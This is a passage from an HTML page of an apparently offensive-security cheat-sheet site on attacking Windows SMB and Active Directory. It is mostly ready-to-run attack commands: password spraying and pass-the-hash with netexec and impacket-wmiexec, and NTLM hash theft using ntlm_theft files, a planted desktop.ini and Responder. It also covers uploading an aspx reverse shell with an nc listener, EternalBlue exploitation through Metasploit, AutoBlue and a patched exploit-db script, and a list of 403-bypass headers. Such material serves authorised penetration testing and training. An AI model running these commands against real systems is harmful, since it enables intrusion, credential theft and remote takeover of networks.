</span><span id="__span-143-2"><a id="__codelineno-143-2" name="__codelineno-143-2" href="#__codelineno-143-2"></a>netexec smb &lt;target-ip&gt; -u John -p Password123 --users
</span><span id="__span-143-3"><a id="__codelineno-143-3" name="__codelineno-143-3" href="#__codelineno-143-3"></a>netexec smb &lt;target-ip&gt; -u John -H &lt;NTLM_HASH&gt; --users
</span><span id="__span-143-4"><a id="__codelineno-143-4" name="__codelineno-143-4" href="#__codelineno-143-4"></a>
</span><span id="__span-143-5"><a id="__codelineno-143-5" name="__codelineno-143-5" href="#__codelineno-143-5"></a># Find users with same password
</span><span id="__span-143-6"><a id="__codelineno-143-6" name="__codelineno-143-6" href="#__codelineno-143-6"></a>netexec smb &lt;target-ip&gt; -u users.txt -p Password123 --continue-on-success
</span><span id="__span-143-7"><a id="__codelineno-143-7" name="__codelineno-143-7" href="#__codelineno-143-7"></a>netexec smb &lt;target-ip&gt; -u users.txt -p found_passwords.txt --continue-on-success
</span><span id="__span-143-8"><a id="__codelineno-143-8" name="__codelineno-143-8" href="#__codelineno-143-8"></a>netexec smb &lt;target-ip&gt; -u users.txt -H &lt;NTLM_HASH&gt; --continue-on-success
</span><span id="__span-143-9"><a id="__codelineno-143-9" name="__codelineno-143-9" href="#__codelineno-143-9"></a>netexec smb &lt;target-ip&gt; -u users.txt -H found_ntlm_hashes.txt --continue-on-success
</span></code></pre></div>
<p><br /></p>
<h2 id="ntlm-stealing">NTLM Stealing</h2>
<h3 id="using-ntlm_theft">Using ntlm_theft</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-144-1"><a id="__codelineno-144-1" name="__codelineno-144-1" href="#__codelineno-144-1"></a># -g all: Generate all files.
</span><span id="__span-144-2"><a id="__codelineno-144-2" name="__codelineno-144-2" href="#__codelineno-144-2"></a># -s: Local IP (attacker IP)
</span><span id="__span-144-3"><a id="__codelineno-144-3" name="__codelineno-144-3" href="#__codelineno-144-3"></a># -f: Folder to store generated files.
</span><span id="__span-144-4"><a id="__codelineno-144-4" name="__codelineno-144-4" href="#__codelineno-144-4"></a>python3 ntlm_theft -g all -s &lt;local-ip&gt; -f samples
</span></code></pre></div>
<p>After generating files with <code>ntlm_theft</code> , put the <code>.lnk</code> file (<code>samples.lnk</code> here) to the shared folder.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-145-1"><a id="__codelineno-145-1" name="__codelineno-145-1" href="#__codelineno-145-1"></a>smbclient -N //10.0.0.1/example
</span><span id="__span-145-2"><a id="__codelineno-145-2" name="__codelineno-145-2" href="#__codelineno-145-2"></a>
</span><span id="__span-145-3"><a id="__codelineno-145-3" name="__codelineno-145-3" href="#__codelineno-145-3"></a>smb&gt; put samples.lnk
</span></code></pre></div>
<p>Now start Responder to retrieve the stolen NTLM hashes. Run the following command in our local machine:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-146-1"><a id="__codelineno-146-1" name="__codelineno-146-1" href="#__codelineno-146-1"></a>sudo responder -I eth0
</span></code></pre></div>
<p><br /></p>
<h2 id="connect_1">Connect</h2>
<p>You can use smbclient to connect the target.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-147-1"><a id="__codelineno-147-1" name="__codelineno-147-1" href="#__codelineno-147-1"></a># anonymous login
</span><span id="__span-147-2"><a id="__codelineno-147-2" name="__codelineno-147-2" href="#__codelineno-147-2"></a>smbclient //10.0.0.1/somedir -N
</span><span id="__span-147-3"><a id="__codelineno-147-3" name="__codelineno-147-3" href="#__codelineno-147-3"></a># If the folder name contains spaces, surround with double quotes
</span><span id="__span-147-4"><a id="__codelineno-147-4" name="__codelineno-147-4" href="#__codelineno-147-4"></a>smbclient &quot;//10.0.0.1/some dir&quot; -N
</span><span id="__span-147-5"><a id="__codelineno-147-5" name="__codelineno-147-5" href="#__codelineno-147-5"></a># Specify user
</span><span id="__span-147-6"><a id="__codelineno-147-6" name="__codelineno-147-6" href="#__codelineno-147-6"></a>smbclient //10.0.0.1/somedir -U username
</span><span id="__span-147-7"><a id="__codelineno-147-7" name="__codelineno-147-7" href="#__codelineno-147-7"></a># nobody, no-pass
</span><span id="__span-147-8"><a id="__codelineno-147-8" name="__codelineno-147-8" href="#__codelineno-147-8"></a>smbclient //10.0.0.1/somedir -N -U nobody
</span><span id="__span-147-9"><a id="__codelineno-147-9" name="__codelineno-147-9" href="#__codelineno-147-9"></a># Specify workgroup
</span><span id="__span-147-10"><a id="__codelineno-147-10" name="__codelineno-147-10" href="#__codelineno-147-10"></a>smbclient -L 10.0.0.1 -W WORKGROUP -U username
</span></code></pre></div>
<p>To get a Windows shell, run the following examples.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-148-1"><a id="__codelineno-148-1" name="__codelineno-148-1" href="#__codelineno-148-1"></a>impacket-wmiexec example.local/username@10.0.0.1
</span><span id="__span-148-2"><a id="__codelineno-148-2" name="__codelineno-148-2" href="#__codelineno-148-2"></a># Pass the Hash
</span><span id="__span-148-3"><a id="__codelineno-148-3" name="__codelineno-148-3" href="#__codelineno-148-3"></a>impacket-wmiexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d example.local/username@10.0.0.1
</span></code></pre></div>
<p><br /></p>
<h2 id="commands-in-smb">Commands in SMB</h2>
<p>After connecting, we can investigate the shared folder to find sensitive files or information.</p>
<h3 id="list-foldersfiles">List Folders/Files</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-149-1"><a id="__codelineno-149-1" name="__codelineno-149-1" href="#__codelineno-149-1"></a>smb&gt; ls
</span></code></pre></div>
<h3 id="download-foldersfiles">Download Folders/Files</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-150-1"><a id="__codelineno-150-1" name="__codelineno-150-1" href="#__codelineno-150-1"></a>smb&gt; get sample.txt
</span><span id="__span-150-2"><a id="__codelineno-150-2" name="__codelineno-150-2" href="#__codelineno-150-2"></a># If the filename contains spaces, it need to be enclosed in double-quotes.
</span><span id="__span-150-3"><a id="__codelineno-150-3" name="__codelineno-150-3" href="#__codelineno-150-3"></a>smb&gt; get &quot;Example File.txt&quot;
</span></code></pre></div>
<p>To download files recursively, run the following commands.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-151-1"><a id="__codelineno-151-1" name="__codelineno-151-1" href="#__codelineno-151-1"></a>smb&gt; mask &quot;&quot;
</span><span id="__span-151-2"><a id="__codelineno-151-2" name="__codelineno-151-2" href="#__codelineno-151-2"></a>smb&gt; recurse ON
</span><span id="__span-151-3"><a id="__codelineno-151-3" name="__codelineno-151-3" href="#__codelineno-151-3"></a>smb&gt; prompt OFF
</span><span id="__span-151-4"><a id="__codelineno-151-4" name="__codelineno-151-4" href="#__codelineno-151-4"></a>smb&gt; mget *
</span></code></pre></div>
<p>Or using smbget from local machine.<br />
Especially, it’s useful for <strong>downloading a large file</strong> rather than “get” command in smbclient.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-152-1"><a id="__codelineno-152-1" name="__codelineno-152-1" href="#__codelineno-152-1"></a>smbget smb://&lt;target-ip&gt;/somedir/example.txt -U username
</span><span id="__span-152-2"><a id="__codelineno-152-2" name="__codelineno-152-2" href="#__codelineno-152-2"></a>smbget -R smb://&lt;target-ip&gt;/somedir -U username
</span><span id="__span-152-3"><a id="__codelineno-152-3" name="__codelineno-152-3" href="#__codelineno-152-3"></a>
</span><span id="__span-152-4"><a id="__codelineno-152-4" name="__codelineno-152-4" href="#__codelineno-152-4"></a># Specify workgroup
</span><span id="__span-152-5"><a id="__codelineno-152-5" name="__codelineno-152-5" href="#__codelineno-152-5"></a>smbget -R smb://&lt;target-ip&gt;/somedir -w WORKGROUP -U username
</span><span id="__span-152-6"><a id="__codelineno-152-6" name="__codelineno-152-6" href="#__codelineno-152-6"></a>
</span><span id="__span-152-7"><a id="__codelineno-152-7" name="__codelineno-152-7" href="#__codelineno-152-7"></a># as anonymous user
</span><span id="__span-152-8"><a id="__codelineno-152-8" name="__codelineno-152-8" href="#__codelineno-152-8"></a>smbget smb://&lt;target-ip&gt;/somedir -U anonymous
</span><span id="__span-152-9"><a id="__codelineno-152-9" name="__codelineno-152-9" href="#__codelineno-152-9"></a>password: anonymous
</span></code></pre></div>
<h3 id="upload-files">Upload Files</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-153-1"><a id="__codelineno-153-1" name="__codelineno-153-1" href="#__codelineno-153-1"></a># Upload a file
</span><span id="__span-153-2"><a id="__codelineno-153-2" name="__codelineno-153-2" href="#__codelineno-153-2"></a>smb&gt; put example.txt
</span></code></pre></div>
<ul>
<li><strong>Upload Reverse Shell Payload</strong></li>
</ul>
<p>If the website is associated with the SMB server, we can upload reverse shell script such as <strong><code>aspx</code></strong>, <strong><code>php</code></strong> and get a shell.<br />
To create a payload, please refer to the <a href="/exploit/shell/web-reverse-shell">Web Reverse Shell</a> or the <a href="/exploit/shell/reverse-shell-with-metasploit">Reverse Shell with Metasploit</a>.</p>
<p>Then upload it to the SMB server as below.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-154-1"><a id="__codelineno-154-1" name="__codelineno-154-1" href="#__codelineno-154-1"></a>smb&gt; put shell.aspx
</span></code></pre></div>
<p>Don’t forget to start a listener for getting outcoming connection.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-155-1"><a id="__codelineno-155-1" name="__codelineno-155-1" href="#__codelineno-155-1"></a>nc -lvnp 4444
</span></code></pre></div>
<p>Now access to <strong><code>https://example.com/path/to/smb/share/shell.aspx</code></strong>.<br />
We can get a shell.</p>
<h3 id="steal-ntlm-hash-with-desktopini">Steal NTLM Hash with Desktop.ini</h3>
<p>Reference: <a href="https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini">https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini</a></p>
<p>We can retrieve the hashes by putting <strong><code>desktop.ini</code></strong> file, that contains arbitrary icon resource path, to the shared folder.<br />
Create a new <strong><code>desktop.ini</code></strong> in local machine.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-156-1"><a id="__codelineno-156-1" name="__codelineno-156-1" href="#__codelineno-156-1"></a>[.ShellClassInfo]
</span><span id="__span-156-2"><a id="__codelineno-156-2" name="__codelineno-156-2" href="#__codelineno-156-2"></a>IconResource=\\&lt;local-ip&gt;\test
</span></code></pre></div>
<p>Then upload it to the writable shared folder.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-157-1"><a id="__codelineno-157-1" name="__codelineno-157-1" href="#__codelineno-157-1"></a>smb&gt; put desktop.ini
</span></code></pre></div>
<p>Start responder in local machine.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-158-1"><a id="__codelineno-158-1" name="__codelineno-158-1" href="#__codelineno-158-1"></a>responder -I tun0
</span></code></pre></div>
<p>After a while, we can retrieve the NTLM hashes.</p>
<p><br /></p>
<h2 id="eternalblue-ms17-010">EternalBlue (MS17-010)</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-159-1"><a id="__codelineno-159-1" name="__codelineno-159-1" href="#__codelineno-159-1"></a>msfconsole
</span><span id="__span-159-2"><a id="__codelineno-159-2" name="__codelineno-159-2" href="#__codelineno-159-2"></a>msf&gt; use exploit/windows/smb/ms17_010_eternalblue
</span><span id="__span-159-3"><a id="__codelineno-159-3" name="__codelineno-159-3" href="#__codelineno-159-3"></a>msf&gt; set rhosts &lt;target-ip&gt;
</span><span id="__span-159-4"><a id="__codelineno-159-4" name="__codelineno-159-4" href="#__codelineno-159-4"></a>msf&gt; set lhost &lt;local-ip&gt;
</span><span id="__span-159-5"><a id="__codelineno-159-5" name="__codelineno-159-5" href="#__codelineno-159-5"></a>msf&gt; run
</span><span id="__span-159-6"><a id="__codelineno-159-6" name="__codelineno-159-6" href="#__codelineno-159-6"></a># If you cannot get a shell with the default payloed (windows/x64/meterpreter/reverse_tcp), try to change the payload
</span><span id="__span-159-7"><a id="__codelineno-159-7" name="__codelineno-159-7" href="#__codelineno-159-7"></a>msf&gt; set payload payload/generic/shell_reverse_tcp
</span></code></pre></div>
<h3 id="autoblue">AutoBlue</h3>
<p><strong><a href="https://github.com/3ndG4me/AutoBlue-MS17-010">AutoBlue</a></strong> is an automatic exploit.<br />
Download the repository and run the following example command.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-160-1"><a id="__codelineno-160-1" name="__codelineno-160-1" href="#__codelineno-160-1"></a>python zzz_exploit.py -target-ip &lt;target-ip&gt; -port 445 &#39;username:password@target&#39;
</span></code></pre></div>
<h3 id="manual-exploiting">Manual Exploiting</h3>
<p>You need to have two files - exploit.py, mysmb.py</p>
<ol>
<li><strong>Download mysmb.py</strong></li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-161-1"><a id="__codelineno-161-1" name="__codelineno-161-1" href="#__codelineno-161-1"></a>    wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py -O mysmb.py 
</span><span id="__span-161-2"><a id="__codelineno-161-2" name="__codelineno-161-2" href="#__codelineno-161-2"></a>
</span><span id="__span-161-3"><a id="__codelineno-161-3" name="__codelineno-161-3" href="#__codelineno-161-3"></a>    # Convert DOS to UNIX
</span><span id="__span-161-4"><a id="__codelineno-161-4" name="__codelineno-161-4" href="#__codelineno-161-4"></a>    dos2unix mysmb.py
</span></code></pre></div>
<ol>
<li>
<p><strong>Edit Some Lines of mysmb.py for Python3</strong></p>
<p>You need to edit some code because this exploit is old so only supports <strong>Python2</strong>.</p>
</li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-162-1"><a id="__codelineno-162-1" name="__codelineno-162-1" href="#__codelineno-162-1"></a>    Line.69
</span><span id="__span-162-2"><a id="__codelineno-162-2" name="__codelineno-162-2" href="#__codelineno-162-2"></a>    # transData = b&#39;&#39;
</span><span id="__span-162-3"><a id="__codelineno-162-3" name="__codelineno-162-3" href="#__codelineno-162-3"></a>    transData = &#39;&#39;
</span><span id="__span-162-4"><a id="__codelineno-162-4" name="__codelineno-162-4" href="#__codelineno-162-4"></a>
</span><span id="__span-162-5"><a id="__codelineno-162-5" name="__codelineno-162-5" href="#__codelineno-162-5"></a>    Line.73
</span><span id="__span-162-6"><a id="__codelineno-162-6" name="__codelineno-162-6" href="#__codelineno-162-6"></a>    # transData = (&#39;\x00&#39; * padLen) + str(parameters)
</span><span id="__span-162-7"><a id="__codelineno-162-7" name="__codelineno-162-7" href="#__codelineno-162-7"></a>    transData = &quot;&quot;.join(map(chr,(b&#39;\x00&#39; * padLen))) + str(parameters)
</span><span id="__span-162-8"><a id="__codelineno-162-8" name="__codelineno-162-8" href="#__codelineno-162-8"></a>
</span><span id="__span-162-9"><a id="__codelineno-162-9" name="__codelineno-162-9" href="#__codelineno-162-9"></a>    Line.80
</span><span id="__span-162-10"><a id="__codelineno-162-10" name="__codelineno-162-10" href="#__codelineno-162-10"></a>    # transData += (&#39;\x00&#39; * padLen) + data
</span><span id="__span-162-11"><a id="__codelineno-162-11" name="__codelineno-162-11" href="#__codelineno-162-11"></a>    transData += &quot;&quot;.join(map(chr,(b&#39;\x00&#39; * padLen))) + str(data)
</span><span id="__span-162-12"><a id="__codelineno-162-12" name="__codelineno-162-12" href="#__codelineno-162-12"></a>
</span><span id="__span-162-13"><a id="__codelineno-162-13" name="__codelineno-162-13" href="#__codelineno-162-13"></a>    Line.231
</span><span id="__span-162-14"><a id="__codelineno-162-14" name="__codelineno-162-14" href="#__codelineno-162-14"></a>    # req = str(pkt)
</span><span id="__span-162-15"><a id="__codelineno-162-15" name="__codelineno-162-15" href="#__codelineno-162-15"></a>    req = pkt.getData()
</span><span id="__span-162-16"><a id="__codelineno-162-16" name="__codelineno-162-16" href="#__codelineno-162-16"></a>    return b&#39;\x00&#39;*2 + pack(&#39;&gt;H&#39;, len(req)) + req  # assume length is &lt;6553
</span><span id="__span-162-17"><a id="__codelineno-162-17" name="__codelineno-162-17" href="#__codelineno-162-17"></a>
</span><span id="__span-162-18"><a id="__codelineno-162-18" name="__codelineno-162-18" href="#__codelineno-162-18"></a>    Line.381
</span><span id="__span-162-19"><a id="__codelineno-162-19" name="__codelineno-162-19" href="#__codelineno-162-19"></a>    # data += resp[&#39;Data&#39;][1:]
</span><span id="__span-162-20"><a id="__codelineno-162-20" name="__codelineno-162-20" href="#__codelineno-162-20"></a>    data += resp[&#39;Data&#39;][1:].decode()
</span></code></pre></div>
<ol>
<li><strong>Download exploit.py</strong></li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-163-1"><a id="__codelineno-163-1" name="__codelineno-163-1" href="#__codelineno-163-1"></a>    wget -O exploit.py https://www.exploit-db.com/exploits/42315
</span><span id="__span-163-2"><a id="__codelineno-163-2" name="__codelineno-163-2" href="#__codelineno-163-2"></a>
</span><span id="__span-163-3"><a id="__codelineno-163-3" name="__codelineno-163-3" href="#__codelineno-163-3"></a>    # Convert DOS to UNIX
</span><span id="__span-163-4"><a id="__codelineno-163-4" name="__codelineno-163-4" href="#__codelineno-163-4"></a>    dos2unix exploit.py
</span></code></pre></div>
<ol>
<li><strong>Edit the Credentials in exploit.py</strong></li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-164-1"><a id="__codelineno-164-1" name="__codelineno-164-1" href="#__codelineno-164-1"></a>    ...
</span><span id="__span-164-2"><a id="__codelineno-164-2" name="__codelineno-164-2" href="#__codelineno-164-2"></a>    username = &quot;username&quot;
</span><span id="__span-164-3"><a id="__codelineno-164-3" name="__codelineno-164-3" href="#__codelineno-164-3"></a>    password = &quot;password&quot;
</span><span id="__span-164-4"><a id="__codelineno-164-4" name="__codelineno-164-4" href="#__codelineno-164-4"></a>    ...
</span></code></pre></div>
<ol>
<li><strong>Run the script</strong></li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-165-1"><a id="__codelineno-165-1" name="__codelineno-165-1" href="#__codelineno-165-1"></a>    python exploit.py &lt;target-ip&gt; netlogon
</span><span id="__span-165-2"><a id="__codelineno-165-2" name="__codelineno-165-2" href="#__codelineno-165-2"></a>    python exploit.py &lt;target-ip&gt; lsarpc
</span><span id="__span-165-3"><a id="__codelineno-165-3" name="__codelineno-165-3" href="#__codelineno-165-3"></a>    python exploit.py &lt;target-ip&gt; samr
</span></code></pre></div>
<p><br /></p>
<h2 id="launch-smb-server">Launch SMB Server</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-166-1"><a id="__codelineno-166-1" name="__codelineno-166-1" href="#__codelineno-166-1"></a>impacket-smbserver share . -smb2support -username user -password pass
</span></code></pre></div>
<h3 id="access-from-remote-machine">Access from Remote Machine</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-167-1"><a id="__codelineno-167-1" name="__codelineno-167-1" href="#__codelineno-167-1"></a>net use \\&lt;local-ip&gt;\share /u:user pass
</span></code></pre></div>
<h3 id="transfer-files">Transfer Files</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-168-1"><a id="__codelineno-168-1" name="__codelineno-168-1" href="#__codelineno-168-1"></a># Remote to Local
</span><span id="__span-168-2"><a id="__codelineno-168-2" name="__codelineno-168-2" href="#__codelineno-168-2"></a>cp .\example.txt \\&lt;local-ip&gt;\share\example.txt
</span></code></pre></div>
<h1 id="403-bypass">403 bypass:</h1>
<div class="language-text highlight"><pre><span></span><code><span id="__span-169-1"><a id="__codelineno-169-1" name="__codelineno-169-1" href="#__codelineno-169-1"></a>Client-IP:
</span><span id="__span-169-2"><a id="__codelineno-169-2" name="__codelineno-169-2" href="#__codelineno-169-2"></a>Connection:
</span><span id="__span-169-3"><a id="__codelineno-169-3" name="__codelineno-169-3" href="#__codelineno-169-3"></a>Contact:
</span><span id="__span-169-4"><a id="__codelineno-169-4" name="__codelineno-169-4" href="#__codelineno-169-4"></a>Forwarded:
</span><span id="__span-169-5"><a id="__codelineno-169-5" name="__codelineno-169-5" href="#__codelineno-169-5"></a>From:
</span><span id="__span-169-6"><a id="__codelineno-169-6" name="__codelineno-169-6" href="#__codelineno-169-6"></a>Host:
</span><span id="__span-169-7"><a id="__codelineno-169-7" name="__codelineno-169-7" href="#__codelineno-169-7"></a>Origin:
</span><span id="__span-169-8"><a id="__codelineno-169-8" name="__codelineno-169-8" href="#__codelineno-169-8"></a>Referer:
</span><span id="__span-169-9"><a id="__codelineno-169-9" name="__codelineno-169-9" href="#__codelineno-169-9"></a>True-Client-IP:
</span><span id="__span-169-10"><a id="__codelineno-169-10" name="__codelineno-169-10" href="#__codelineno-169-10"></a>X-Client-IP:
</span><span id="__span-169-11"><a id="__codelineno-169-11" name="__codelineno-169-11" href="#__codelineno-169-11"></a>X-Custom-IP-Authorization:
</span><span id="__span-169-12"><a id="__codelineno-169-12" name="__codelineno-169-12" href="#__codelineno-169-12"></a>X-Forward-For:
</span><span id="__span-169-13"><a id="__codelineno-169-13" name="__codelineno-169-13" href="#__codelineno-169-13"></a>X-Forwarded-For:
</span><span id="__span-169-14"><a id="__codelineno-169-14" name="__codelineno-169-14" href="#__codelineno-169-14"></a>X-Forwarded-Host:
</span><span id="__span-169-15"><a id="__codelineno-169-15" name="__codelineno-169-15" href="#__codelineno-169-15"></a>X-Forwarded-Server:
</span><span id="__span-169-16"><a id="__codelineno-169-16" name="__codelineno-169-16" href="#__codelineno-169-16"></a>X-Host:
</span><span id="__span-169-17"><a id="__codelineno-169-17" name="__codelineno-169-17" href="#__codelineno-169-17"></a>X-Original-URL:
</span><span id="__span-169-18"><a id="__codelineno-169-18" name="__codelineno-169-18" href="#__codelineno-169-18"></a>X-Originating-IP:
</span><span id="__span-169-19"><a id="__codelineno-169-19" name="__codelineno-169-19" href="#__codelineno-169-19"></a>X-Real-IP:
</span><span id="__span-169-20"><a id="__codelineno-169-20" name="__codelineno-169-20" href="#__codelineno-169-20"></a>X-Remote-Addr:
</span><span id="__span-169-21"><a id="__codelineno-169-21" name="__codelineno-169-21" href="#__codelineno-169-21"></a>X-Remote-IP:
</span><span id="__span-169-22"><a id="__codelineno-169-22" name="__codelineno-169-22" href="#__codelineno-169-22"></a>X-Rewrite-URL:
</span><span id="__span-169-23"><a id="__codelineno-169-23" name="__codelineno-169-23" href="#__codelineno-169-23"></a>X-Wap-Profile:
</span><span id="__span-169-24"><a id="__codelineno-169-24" name="__codelineno-169-24" href="#__codelineno-169-24"></a>X-Forwarder-Server:
</span><span id="__span-169-25"><a id="__codelineno-169-25" name="__codelineno-169-25" href="#__codelineno-169-25"></a>X-Forwarder-Host:
</span><span id="__span-169-26"><a id="__codelineno-169-26" name="__codelineno-169-26" href="#__codelineno-169-26"></a>X-Forwarded-proto headers:
</span></code></pre></div>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/os/windows/active-directory/basic-knowledge.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
</footer>

</body>
</html>